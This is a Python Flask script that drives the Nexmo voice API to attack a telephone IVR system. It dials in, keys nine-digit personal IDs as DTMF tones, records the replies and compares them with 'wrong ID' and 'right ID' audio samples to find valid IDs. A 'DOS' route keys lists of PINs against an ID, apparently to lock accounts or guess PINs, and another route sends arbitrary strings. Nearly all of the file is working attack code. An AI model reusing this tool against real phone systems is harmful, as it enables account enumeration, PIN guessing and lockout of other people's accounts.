#!/usr/bin/env python3
from flask import Flask, request, jsonify
import nexmo
from pprint import pprint
import librosa
from dtw import dtw
from numpy.linalg import norm
import os

client = nexmo.Client(application_id='PUT APPLICATION ID HERE',private_key='PUT PRIVATE KEY DIRECTORY HERE',) # make sure to place your nexmo appID and private key here
app=Flask(__name__)
ConvoArr={}

def load_files_for_audio_comp(file1):
    y1, sr1 = librosa.load(file1) #change this to the location of the audiofile with the "wrong ID" recording
    return y1,sr1

def compare_Audio_Files(file1,file2):
    y1,sr1=load_files_for_audio_comp(file1)
    y2,sr2=load_files_for_audio_comp(file2)
    mfcc1 = librosa.feature.mfcc(y1,sr1)
    mfcc2 = librosa.feature.mfcc(y2, sr2)
    idontknow=lambda x,y:norm(x-y, ord=1)
    dist, cost, path ,what= dtw(mfcc1.T, mfcc2.T,dist=idontknow)
    return dist

def sending_id_for_convo_uuid(convo_uuid):
    for single_digit in ConvoArr[convo_uuid]['personal_id']:
        whatever = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=single_digit)
    return 'boom boom'

def sending_pin_for_convo_uuid(convo_uuid,pin):
    for single_digit in pin:
        whatever = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=single_digit)
    return 'boom boom'

def sending_strings_for_convo_uuid(convo_uuid):
    for x in ConvoArr[convo_uuid]['strings_to_send']:
        whateverr = client.send_dtmf(ConvoArr[convo_uuid]['uuid'], digits=x)
    return 'pow'

@app.route("/api/answering/<string:personal_id>")
def answer_call(personal_id):
    while(len(str(personal_id))<9):
        personal_id="0"+personal_id
    ConvoArr[request.args.get('conversation_uuid')]={"uuid":request.args.get('uuid'),"personal_id":personal_id}
    ncco = [{"action": "input", "eventUrl": ["http://api_endpoint/api/send_id"], "name": "waiting", "timeOut": 3},{"action": "record","eventUrl": ["http://api_endpoint/api/recordings/id"], "name": "send_record","timeOut":4}]
    print("Started call for ID: "+personal_id)
    return jsonify(ncco)

@app.route("/api/answering-dos/<string:pins>/<string:personal_id>/")
def answer_all_with_dos(personal_id,pins):
    pinArray=pins.split(",")
    ncco=[{"action":"input","eventUrl":["http://api_endpoint/api/send_id"],"name":"waiting","timeOut":3},{"action":"record","eventUrl":["http://api_endpoint/api/recordings/dos"],"name":"send_record"}]
    for i in range(0,len(pinArray)):
        ncco.append({"action": "input", "eventUrl": ["http://api_endpoint/api/send_pin/" + pinArray[i]], "name":"waiting","timeOut": 5})
    ConvoArr[request.args.get('conversation_uuid')]={"uuid":request.args.get('uuid'),"personal_id":personal_id,"pinArray":pins}
    ncco.append({"action":"input","eventUrl":["http://api_endpoint/api/just_wait/"],"name":"waiting","timeOut":15})
    print("Started DOS call for ID: " + personal_id+", with PINs "+pins)
    return jsonify(ncco)

@app.route("/api/answering_strings/<string:strings_to_send>")
def sending_abcd(strings_to_send):
    ConvoArr[request.args.get('conversation_uuid')] = {"uuid": request.args.get('uuid'), "strings_to_send": strings_to_send}
    timeoutseconds=len(strings_to_send)/3
    ncco = [
        {"action": "input", "eventUrl": ["http://api_endpoint/api/send_strings"], "name": "waiting", "timeOut": timeoutseconds},
        {"action": "record", "eventUrl": ["http://api_endpoint/api/recordings/strings"], "name": "send_record",
         "timeOut": 10}]
    return jsonify(ncco)

@app.route("/api/send_id", methods=['POST'])
def sending_id():
    data = request.get_json()
    sending_id_for_convo_uuid(data['conversation_uuid'])
    return "I wish I was a little bit taller"


@app.route("/api/send_strings", methods=['POST'])
def sending_strings():
    data = request.get_json()
    sending_strings_for_convo_uuid(data['conversation_uuid'])
    return "I wish I was a baller"

@app.route("/api/send_pin/<string:pin>", methods=['POST'])
def sending_pin(pin):
    data = request.get_json()
    sending_pin_for_convo_uuid(data['conversation_uuid'],pin)
    return "I wish I had a girl, that looked good, I would call her"

@app.route("/api/recordings/<string:functionality>", methods=['POST'])
def recordings(functionality):
    data=request.get_json()
    a_record=client.get_recording(data['recording_url'])
    if(functionality=='id'):
        fileName="ID_"+ConvoArr[data['conversation_uuid']]['personal_id']+".mp3"
        f=open(fileName,'wb+')
        f.write(a_record)
        f.close()
        comparedValue=compare_Audio_Files('wrongID.mp3',fileName)
        if(int(comparedValue)>40000 and int(comparedValue)<150000): # this will check if the file is different from the wrong ID recording, above 40000 value means the recording contains a different phrase WARNING: will contain false positives due to inconsistency in the phone line
            new_file_name = "Difference_" + str(int(comparedValue)) + "_" + fileName
            print("The ID: "+ConvoArr[data['conversation_uuid']]['personal_id']+" returned a different response, comparing it against the right ID recording")
            newcomparison=compare_Audio_Files('rightID.mp3',fileName)
            if(int(newcomparison)<45000):
                new_file_name = "RightID_Difference_" + str(int(newcomparison)) + "_"+fileName
                os.rename(fileName,new_file_name)
                print("The ID " +ConvoArr[data['conversation_uuid']]['personal_id'] + " sounds like the right ID recording!!!!")
            else:
                os.rename(fileName, new_file_name)
        else:
            os.rename(fileName, "maybe_garbage" + fileName)
    if (functionality == 'dos'):
        fileName = "ID_DOSed_" + ConvoArr[data['conversation_uuid']]['personal_id'] + "_PINS_"+str(ConvoArr[data['conversation_uuid']]["pinArray"])+".mp3"
        f = open(fileName, 'wb+')
        f.write(a_record)
        f.close()
        print("ID: " + str(ConvoArr[data['conversation_uuid']]['personal_id']) + " was DOSed with PINs: " + str(ConvoArr[data['conversation_uuid']]["pinArray"]))
    if(functionality=='strings'):
        f = open("Sent_Strings_" + ConvoArr[data['conversation_uuid']]['strings_to_send'] + ".mp3", 'wb+')
        f.write(a_record)
        f.close()
    return "I wish I had a girl, that looked good, I would call her"


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)

